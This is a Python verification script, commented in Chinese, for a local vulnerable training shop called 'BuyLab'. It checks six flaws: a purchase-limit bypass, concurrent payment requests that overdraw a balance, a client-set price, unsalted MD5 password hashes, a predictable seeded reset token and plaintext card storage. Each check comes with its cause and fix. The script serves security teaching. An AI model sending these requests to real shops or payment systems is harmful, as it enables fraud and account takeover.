#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_buylab.py — A06 不安全設計 + A04 加密失效 驗證
=============================================================================
 對應研究報告 CH02.1「發現與驗證分離」與 CH06 S1。

 驗證方式的特色：
   B1/B2 是**競態條件**（race condition），單次請求無法證明存在——
   必須用**並發請求**觸發。這與先前的注入類、A09 類都不同：
     注入類：看回應
     A09  ：看日誌檔
     競態  ：必須「同時送出多個請求」才能觀察到
   → 再次印證 CH02.1：驗證方式必須配合漏洞類型。

 用法：
   python verify_buylab.py [port]
=============================================================================
"""

import concurrent.futures
import hashlib
import json
import re
import sys
import urllib.error
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8906
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=20) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, owasp, passed, evidence):
    results.append((name, owasp, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 74)
    print("[%s] %s  —  %s" % (mark, name, owasp))
    print("-" * 74)
    for line in evidence.splitlines():
        print("   " + line)


# ---------------------------------------------------------------------------
def b1_limit_bypass():
    """B1：限購繞過（含競態）。"""
    get("/reset")
    # 方式 A：順序重複下單（繞過限購，因為檢查只算已付款）
    ok_seq = 0
    for i in range(3):
        st, body = get("/buy?uid=1&pid=1&qty=1")
        if st == 200 and "下單成功" in body:
            ok_seq += 1
    ev = [
        "步驟 1    : GET /reset",
        "步驟 2    : 連續 3 次 GET /buy?uid=1&pid=1&qty=1（限購 1 件）",
        "預期漏洞  : 全部成功（限購檢查只算 paid=1，未付款訂單不計）",
        "實際      : 成功 %d/3 次下單" % ok_seq,
        "根因      : (a) 限購條件寫成 `paid=1`，未付款即可繞過",
        "            (b) 檢查與寫入之間沒有鎖（check-then-act）",
        "OWASP 對照: A06 官方強調『設計層缺陷無法靠實作修補』——",
        "            這裡的問題是**限購規則本身的定義**就有漏洞",
        "修補方向  : 限購應以「所有訂單」計算，並以資料庫唯一約束或",
        "            SELECT ... FOR UPDATE 保證原子性",
    ]
    check("B1 限購可繞過（check-then-act）", "A06 / CWE-799 / CWE-362",
          ok_seq >= 2, "\n".join(ev))


def b2_toctou_race():
    """B2：TOCTOU 競態（併發扣款可超額）。"""
    get("/reset")            # 餘額 5000
    amount = 4000
    # 併發送出 3 筆扣款：若為 TOCTOU，會有多筆通過「餘額足夠」檢查
    def pay(_):
        return get("/pay?uid=1&amount=%d" % amount)

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
        res = list(ex.map(pay, range(3)))

    ok_count = sum(1 for st, b in res if st == 200 and "扣款成功" in b)
    # 查最終餘額
    st_f, body_f = get("/pay?uid=1&amount=1")     # 觸發一次讀取以取得餘額
    m = re.search(r"餘額\s*(-?\d+)", body_f)
    final = int(m.group(1)) if m else None
    overdrawn = (final is not None and final < 0) or (ok_count > 1)

    ev = [
        "步驟 1    : GET /reset（餘額設為 5000）",
        "步驟 2    : **併發**送出 3 筆 GET /pay?uid=1&amount=4000",
        "預期漏洞  : 多筆通過「餘額足夠」檢查（TOCTOU），導致超額扣款",
        "實際      : 成功扣款 %d 筆（餘額僅夠 1 筆 = 5000/4000）" % ok_count,
        "最終餘額  : %s" % (final if final is not None else "?"),
        "根因      : 檢查（SELECT balance）與扣款（UPDATE）分離，中間無鎖/交易",
        "危害      : 可重複消費、超額提領——金融系統的典型嚴重缺陷",
        "驗證方式  : 必須用**並發請求**；單次請求永遠看起來正常",
        "修補方向  : 單一原子 UPDATE（WHERE balance >= ?）並檢查受影響列數；",
        "            或使用交易的 SELECT ... FOR UPDATE",
        "OWASP 對照: A06——設計時就該假設「檢查與使用之間會被穿插」",
    ]
    check("B2 TOCTOU 競態（超額扣款）", "A06 / CWE-367", overdrawn, "\n".join(ev))


def b3_client_side_price():
    """B3：價格由客戶端提供。"""
    get("/reset")
    st, body = get("/buy?uid=1&pid=2&qty=1&price=1")
    # 檢查回傳的單價是否為 1（客戶端提供）而非 DB 的 100
    m = re.search(r"單價=(\d+)（DB 原價 (\d+)）", body)
    accepted = False
    if m:
        accepted = (int(m.group(1)) == 1) and (int(m.group(2)) == 100)
    ev = [
        "步驟 1    : GET /reset",
        "步驟 2    : GET /buy?uid=1&pid=2&qty=1&price=1（DB 原價 100）",
        "預期漏洞  : 伺服器採用客戶端提供的 price=1",
        "實際      : 採用客戶端價格 = %s（%s）" % (
            accepted, m.group(0) if m else "無法解析"),
        "根因      : 價格這種「業務事實」不該由客戶端決定（信任邊界錯誤）",
        "危害      : 1 元買到 100 元商品；也可傳負數造成退款漏洞",
        "修補方向  : 價格一律由伺服器端從資料庫查詢；",
        "            客戶端只能傳 product_id 與 qty",
        "OWASP 對照: A06——這是**信任邊界（trust boundary）設計錯誤**，",
        "            不是輸入驗證問題（就算驗證格式為數字也一樣錯）",
    ]
    check("B3 價格由客戶端提供", "A06 / CWE-472", accepted, "\n".join(ev))


def b4_weak_password_hash():
    """B4：MD5 無 salt。"""
    st, body = get("/users")
    known = hashlib.md5(b"123456").hexdigest()
    hit = known in body.lower()
    ev = [
        "步驟 1    : GET /users",
        "預期漏洞  : 密碼雜湊為無 salt MD5，可用已知值反查",
        "實際      : HTTP %s，md5('123456') 命中 = %s" % (st, hit),
        "驗證方式  : md5('123456') = %s" % known,
        "根因      : 使用快速雜湊且無 salt",
        "危害      : 彩虹表可瞬間還原；相同密碼產生相同雜湊（可看出共用密碼）",
        "修補方向  : Argon2id / bcrypt / scrypt（自帶 salt、可調成本）",
    ]
    check("B4 MD5 無 salt 儲存密碼", "A04 / CWE-916", hit, "\n".join(ev))


def b5_weak_random():
    """B5：可預測的隨機 token。"""
    # 攻擊者若知道 seed 就能完全重現 token
    st1, b1 = get("/reset_token?uid=1&seed=12345")
    st2, b2 = get("/reset_token?uid=1&seed=12345")
    m1 = re.search(r"token=(\d+)", b1)
    m2 = re.search(r"token=(\d+)", b2)
    same = bool(m1 and m2 and m1.group(1) == m2.group(1))
    predictable = same
    ev = [
        "步驟 1    : GET /reset_token?uid=1&seed=12345",
        "步驟 2    : 再次 GET /reset_token?uid=1&seed=12345",
        "預期漏洞  : 相同 seed 產生**完全相同**的 token（可預測）",
        "實際      : token 相同 = %s（%s vs %s）" % (
            same, m1.group(1) if m1 else "?", m2.group(1) if m2 else "?"),
        "根因      : 使用 Mersenne Twister（random 模組），非密碼學安全隨機",
        "            （且本靶場允許注入 seed，用以示範可預測性）",
        "危害      : 攻擊者能預測他人的重設 token → 帳號接管",
        "修補方向  : secrets.token_urlsafe() / os.urandom()（CSPRNG）；",
        "            且 token 不得允許任何形式的 seed 注入",
        "OWASP 對照: A04 涵蓋『使用弱隨機』；CWE-338 即此類",
    ]
    check("B5 可預測的隨機 token", "A04 / CWE-338", predictable, "\n".join(ev))


def b6_plaintext_sensitive():
    """B6：敏感資料明文儲存。"""
    st, body = get("/cards")
    has_card = bool(re.search(r"\d{16}", body))
    has_balance = "balance=" in body
    ev = [
        "步驟 1    : GET /cards",
        "預期漏洞  : 卡號與餘額以明文儲存並可讀取",
        "實際      : 明文卡號 = %s；明文餘額 = %s" % (has_card, has_balance),
        "根因      : 敏感欄位未加密（at rest）",
        "危害      : 資料庫外洩即等同完整卡號外洩；不符 PCI DSS",
        "修補方向  : 卡號加密儲存（或只存末四碼 + 不可逆 token）；",
        "            傳輸必須 TLS；金鑰交由 KMS 管理",
        "OWASP 對照: A04 官方首要原則——「不要以明文儲存敏感資料」",
    ]
    check("B6 敏感資料明文儲存", "A04 / CWE-311",
          has_card and has_balance, "\n".join(ev))


def main():
    print("=" * 74)
    print(" BuyLab 漏洞驗證 — A06 不安全設計 / A04 加密失效")
    print(" 目標：%s" % BASE)
    print("=" * 74)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線 %s（HTTP %s）" % (BASE, st))
        print("       請先啟動：python buyLab.py %d" % PORT)
        sys.exit(1)

    for fn in (b1_limit_bypass, b2_toctou_race, b3_client_side_price,
               b4_weak_password_hash, b5_weak_random, b6_plaintext_sensitive):
        try:
            fn()
        except Exception as e:                                # noqa: BLE001
            check(fn.__name__, "-", False, "執行時例外：%s" % e)

    print("\n" + "=" * 74)
    print(" 總結")
    print("=" * 74)
    found = sum(1 for _, _, p, _ in results if p)
    for name, owasp, passed, _ in results:
        print("  %-34s %-24s %s" % (name, owasp, "漏洞存在" if passed else "未觸發"))
    print("-" * 74)
    print("  共 %d/%d 個漏洞被驗證存在" % (found, len(results)))
    print("=" * 74)

    out = [{"name": n, "owasp": o, "present": p} for n, o, p, _ in results]
    with open("buylab_result.json", "w", encoding="utf-8") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 buylab_result.json）")


if __name__ == "__main__":
    main()
